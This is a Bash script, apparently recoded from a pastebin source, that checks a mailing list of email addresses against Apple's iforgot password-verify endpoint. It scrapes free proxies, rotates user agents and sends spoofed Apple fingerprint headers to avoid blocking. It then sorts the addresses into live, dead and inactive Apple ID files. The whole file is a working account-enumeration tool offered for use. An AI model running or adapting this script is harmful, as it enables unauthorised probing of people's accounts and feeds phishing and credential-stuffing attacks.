#!/bin/bash
# http://asdf.gg/apple.sh
# hasil recode dari source https://pastebin.com/AZP33cUp

if [ ! -d tmp ];then
 mkdir tmp
fi

#ambil User-Agent
cat > tmp/ua.lst <<_EOF
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1
Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
_EOF
Proxy(){
echo "+ ambil Proxy terbaru dari free-proxy-list.net......."
#ambil Proxy terbaru
if [ -f tmp/proxy ];then
 rm -f tmp/proxy
fi
if [ -f tmp/proxy ];then
 rm -f tmp/proxy.lst
fi
if [ -f tmp/proxy.txt ];then
 rm -f tmp/proxy.txt
fi

wget -q https://free-proxy-list.net -O tmp/proxy.txt
for ambil in {1..81}
do
cat tmp/proxy.txt | awk '{gsub("Last Checked</th></tr></thead><tbody>","~")}1' | awk '{gsub("</tr></tbody><tfoot><tr>","~")}1' | grep "~" | cut -d '~' -f 2 | awk '{gsub("<tr>","~")}1' | cut -d '~' -f $ambil | awk '{gsub("<td>","ambil=:")}1' | awk '{gsub("</td>",":")}1' | egrep -o "ambil=\:[^\:]+" | head -2 | cut -d ":" -f 2 | paste -d ":" -s >> tmp/proxy
done
cat tmp/proxy | grep ":" | uniq > tmp/proxy.lst
cat tmp/proxy.lst
}

# Do automatic update
# before passing arguments
# echo "[+] Doing an automatic update from server slackerc0de.us on `date`"
# updater "auto"


if [[ $inputFile == '' || $targetFolder == '' || $sendList == '' || $perSec == '' ]]; then
  cli_mode="interactive"
else
  cli_mode="interpreter"
fi

# Assign false value boolean
# to both options when its null
if [ -z "${isDel}" ]; then
  isDel='n'
fi

if [ -z "${isCompress}" ]; then
  isCompress='n'
fi

SECONDS=0

# Asking user whenever the
# parameter is blank or null
if [[ $inputFile == '' ]]; then
  # Print available file on
  # current folder
  # clear
  read -p "Enter mailist file: " inputFile


fi

if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder are exists, append to them ? [y/n]: " isAppend
    if [[ $isAppend == 'n' ]]; then
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi

if [[ $isDel == '' || $cli_mode == 'interactive' ]]; then
  read -p "Delete list per check ? [y/n]: " isDel
fi

if [[ $isCompress == '' || $cli_mode == 'interactive' ]]; then
  read -p "Compress the result ? [y/n]: " isCompress
fi

if [[ $sendList == '' ]]; then
  read -p "How many list send: " sendList
fi

if [[ $perSec == '' ]]; then
  read -p "Delay time: " perSec
fi


urlencode() {
    # urlencode <string>

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%s' "$c" | xxd -p -c1 |
                   while read c; do printf '%%%s' "$c"; done ;;
        esac
    done
}


fatkus_request() {
  # Regular Colors
  BLACK='\033[0;30m'
  RED='\033[0;31m'
  GREEN='\033[0;32m'
  YELLOW='\033[0;33m'
  BLUE='\033[0;34m'
  PURPLE='\033[0;35m'
  CYAN='\033[0;36m'
  NC='\033[0m'

  # Bold
  BBlack='\033[1;30m'
  BRed='\033[1;31m'
  BGreen='\033[1;32m'
  BYellow='\033[1;33m'
  BBlue='\033[1;34m'
  BPurple='\033[1;35m'
  BCyan='\033[1;36m'

  # Underline
  UBlack='\033[4;30m'
  URed='\033[4;31m'
  UGreen='\033[4;32m'
  UYellow='\033[4;33m'
  UBlue='\033[4;34m'
  UPurple='\033[4;35m'
  UCyan='\033[4;36m'

  # Background
  On_Black='\033[40m'
  On_Red='\033[41m'
  On_Green='\033[42m'
  On_Yellow='\033[43m'
  On_Blue='\033[44m'
  On_Purple='\033[45m'
  On_Cyan='\033[46m'

  # High Intensty
  IBlack='\033[0;90m'
  IRed='\033[0;91m'
  IGreen='\033[0;92m'
  IYellow='\033[0;93m'
  IBlue='\033[0;94m'
  IPurple='\033[0;95m'
  ICyan='\033[0;96m'

  # Bold High Intensty
  BIBlack='\033[1;90m'
  BIRed='\033[1;91m'
  BIGreen='\033[1;92m'
  BIYellow='\033[1;93m'
  BIBlue='\033[1;94m'
  BIPurple='\033[1;95m'
  BICyan='\033[1;96m'

  # High Intensty backgrounds
  On_IBlack='\033[0;100m'
  On_IRed='\033[0;101m'
  On_IGreen='\033[0;102m'
  On_IYellow='\033[0;103m'
  On_IBlue='\033[0;104m'
  On_IPurple='\033[10;95m'
  On_ICyan='\033[0;106m'

  SECONDS=0

  # echo "$1 => $csrf | $nsid"
  cproxy="$(grep -c ':' tmp/proxy.lst)"
#  if [[ $cproxy > 0 ]]; then
#  Proxy
#  fi
  rand_useragent=$(head -$((${RANDOM} % `wc -l < tmp/ua.lst` + 1)) tmp/ua.lst | tail -1)
  rand_proxy=$(head -$((${RANDOM} % `wc -l < tmp/proxy.lst` + 1)) tmp/proxy.lst | tail -1)
  posted=`curl --max-time 20 --connction-timeout 20 --proxy "$rand_proxy" 'https://iforgot.apple.com/password/verify/appleid' -H 'Origin: https://iforgot.apple.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'X-Apple-I-FD-Client-Info: {"U":"'$rand_useragent'","L":"en-US","Z":"GMT+01:00","V":"1.1","F":"Fla44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZr_WhXTA2s.XTVV26y8GGEDd5ihORoVyFGh8cmvSuCKzIlnY6xljQlpRD_WhtdBbfOkexf7_OLgiPFTuESBRPLraa6hpgmVidPZW2AUMnGWVQdgMVQdg1kzoMpwoNJ9z4oYYLzZ1kzDlSgyyITL5q8sgEV18u1.BUs_43wuZPup_nH2t05oaYAhrcpMxE6DBUr5xj6KkuL5raZmThb1fqgXK_Pmtd0vcxolldQTPNTrLn91zDz.ICMpwoNSdzXrdwNBwe98vDdYejftckuyPBDjaY2ftckkCoq1HACVdVxJmavSY9v5iLs2dI_AIQjvEodUW2vqCRjOI0NTg7lr9ey.25.ea1b9BRcWqrTKyc2x8jXGfe2RjOI0NFgBFY5BNlrJNNlY5QB4bVNjMk.8D3"}' -H 'Accept-Language: en-US,en;q=0.9' -H 'sstt: bGRU9ZOFkiK52gs1vXN9qI3a8kfF9IzdEE5EWO31eJVbNwL0okyKms0hU68xT7EnVZB07Y%2BqRX3qq3JVyGZIJL%2FrWMqCriSP4sf3pvznkDNvn09NAnNtUPkBelJiJDIUN52GIzbmfjXY1FbUJX%2FB6977P8raqmk%2F1rWz8F47QqgtMDObr04lPkMjnwD8yB00b5ZLVBtXHtgkXxKRAGxrzQctmOv8oF1kTuSXCY4cK5fa8JcJPkY1eTP8Wi3KJNkR5gsF75baUvZ00lndbvL6YknzM1s7cnizVm4aYexr%2BRUG7N%2Ffsa4I2wXmlRk55mL9uw%2BxDp3%2FMzDev9LEFZInWVrBXrMb8GxFm4U6DHUAWTKnyrrHtw7pljccIvbny8BTULd6qpfzT1nlX%2Bzt' -H 'User-Agent: ${rand_useragent}' -H 'Content-Type: application/json' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://iforgot.apple.com/password/verify/appleid' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' --data-binary '{"id":"'$1'"}' --compressed -D - -s -L`
  duration=$SECONDS

  dead="$(echo "$posted" | grep -c 'account/emailnotfound')"
  unkown="$(echo "$posted" | grep -c '503 Service Temporarily Unavailable')"
  live="$(echo "$posted" | grep -c '/session/timeout')"
  inactive="$(echo "$posted" | grep -c 'This person record is inactive.')"
  forbidden="$(echo "$posted" | grep -c '403 Forbidden')"
  header="${UYellow}`date +%H:%M:%S` from ${BICyan}$inputFile ${BIGreen}to ${BCyan}$targetFolder ${BPurple}$rand_proxy"

  if [[ $dead == 1 ]]; then
         printf "[$header] $2/$3. ${BIRed}DIE => $1 ${NC}"
         echo "$1" >> $4/die.txt
         elif [[ $live == 2 ]]; then
         printf "[$header] $2/$3. ${BGreen}LIVE => $1 ${NC}"
         echo "$1" >> $4/live.txt
         elif [[ $inactive == 1 ]]; then
         printf "[$header] $2/$3. ${CYAN}INACTIVE => $1 ${NC}"
         echo "$1" >> $4/inactive.txt
         elif [[ $unkown > 0 ]]; then
#         grep -v -- "$rand_proxy" tmp/proxy.lst > "tmp/proxy_temp" && mv "tmp/proxy_temp" tmp/proxy.lst
#         printf "[$header] $2/$3. ${CYAN}BANNED => $1 ${NC} - REMAINING $(grep -c ":" tmp/proxy.lst) Proxy"
         printf "[$header] $2/$3. ${CYAN}BANNED => $1 ${NC}"
         echo "$1" >> $4/recheck.txt
         echo "$rand_proxy" >> proxyBANNED.txt
         elif [[ $forbidden == 3 ]]; then
         printf "[$header] $2/$3. ${CYAN}403 FORBIDDEN => $1 ${NC}"
         echo "$1" >> $4/recheck.txt
         echo "$rand_proxy" >> proxy_forbidden.txt
         else
#         grep -v -- "$rand_proxy" tmp/proxy.lst > "tmp/proxy_temp" && mv "tmp/proxy_temp" tmp/proxy.lst
#         printf "[$header] $2/$3. ${CYAN}PROXY ERROR => $1 ${NC} - REMAINING $(grep -c ":" tmp/proxy.lst) Proxy"
         printf "[$header] $2/$3. ${CYAN}PROXY ERROR => $1 ${NC}"
         echo "$rand_proxy" >> proxy_error.txt
         echo "$1" >> $4/recheck.txt
         echo "========================================================================${rand_proxy}========================================================================" >> reason.txt
         echo "Waktu : $(date)" >> reason.txt
         echo "Email : $1" >> reason.txt
         echo "Proxy : $rand_proxy" >> reason.txt
         echo "User-Agent : $rand_useragent" >> reason.txt
         echo "" >> reason.txt
         echo "$posted" >> reason.txt
         echo "========================================================================${rand_proxy}========================================================================" >> reason.txt
  fi

  # rm -f $1.html

  printf "\n"
}

if [[ ! -f $inputFile ]]; then
  echo "[404] File mailist not found. Check your mailist file name."
  ls -l
  exit
fi

# Preparing file list
# by using email pattern
# every line in $inputFile
echo "[+] Cleaning your mailist file"
grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' $inputFile | tr '[:upper:]' '[:lower:]' | sort | uniq > temp_list && mv temp_list $inputFile

# Finding match mail provider
echo "#################PROXY##################"
Proxy
echo "########################################"
# Print total line of mailist
totalLines=`grep -c "@" $inputFile`
echo "There are $totalLines of list."
echo " "
echo "Hotmail: `grep -c "@hotmail" $inputFile`"
echo "Yahoo: `grep -c "@yahoo" $inputFile`"
echo "Apple: `grep -c "@Apple" $inputFile`"
echo "Gmail: `grep -c "@gmail" $inputFile`"
echo "Aol: `grep -c "@aol" $inputFile`"
echo "########################################"
# Extract email per line
# from both input file
IFS=$'\r\n' GLOBIGNORE='*' command eval  'mailist=($(cat $inputFile))'
con=1

# get_token

echo "[+] Sending $sendList email per $perSec seconds"

for (( i = 0; i < "${#mailist[@]}"; i++ )); do
  username="${mailist[$i]}"
  indexer=$((con++))
  tot=$((totalLines--))
  fold=`expr $i % $sendList`
  if [[ $fold == 0 && $i > 0 ]]; then
    header="`date +%H:%M:%S`"
    duration=$SECONDS
#    echo "Waiting $perSec seconds. $(($duration / 3600)) hours $(($duration / 60 % 60)) minutes and $(($duration % 60)) seconds elapsed, ratio $sendList email / $perSec seconds"
    sleep $perSec
  fi

  # if [[ -f $targetFolder/unknown.txt ]]; then
  #   echo "Token expired. Waiting last request done..."
  #   wait
  #   sleep 1
  #   get_token
  #   sleep 2
  #   rm -f $targetFolder/unknown.txt
  # fi
  
  fatkus_request "$username" "$indexer" "$tot" "$targetFolder" "$inputFile" &

  if [[ $isDel == 'y' ]]; then
    grep -v -- "$username" $inputFile > "$inputFile"_temp && mv "$inputFile"_temp $inputFile
  fi
done

# waiting the background process to be done
# then checking list from garbage collector
# located on $targetFolder/unknown.txt
echo "[+] Waiting background process to be done"
wait
wc -l $targetFolder/*

if [[ $isCompress == 'y' ]]; then
  tgl=`date`
  tgl=${tgl// /-}
  zipped="$targetFolder-$tgl.zip"

  echo "[+] Compressing result"
  zip -r "compressed/$zipped" "$targetFolder/die.txt" "$targetFolder/live.txt" "$targetFolder/limited.txt"
  echo "[+] Saved to compressed/$zipped"
  mv $targetFolder haschecked
  echo "[+] $targetFolder has been moved to haschecked/"
fi
#rm $inputFile
duration=$SECONDS
echo "Checking done in $(($duration / 3600)) hours $(($duration / 60 % 60)) minutes and $(($duration % 60)) seconds."

